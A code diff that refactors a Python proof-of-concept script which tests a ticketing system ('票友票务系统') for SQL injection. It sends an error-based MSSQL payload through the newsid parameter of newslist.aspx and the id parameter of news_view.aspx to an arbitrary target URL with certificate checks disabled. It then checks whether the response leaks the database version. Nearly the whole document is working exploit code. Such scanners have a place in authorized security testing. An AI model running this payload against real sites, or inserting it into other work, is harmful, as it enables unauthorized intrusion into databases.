@@ -10,27 +10,20 @@ description: 文件/newslist.aspx中,参数newsid存在SQL注入。
 import sys
 import requests
 import warnings
-  
-  
-
-class newsview_list:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['票友票务系统通用sql注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/newslist.aspx?newsid=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
                 result[2]=  '存在'
                 result[1] = vulnurl
 
-            vulnurl = self.url + "/news_view.aspx?id=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
+            vulnurl = url + "/news_view.aspx?id=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
                 result[2]=  '存在'
@@ -44,5 +37,4 @@ class newsview_list:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = newsview_list(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
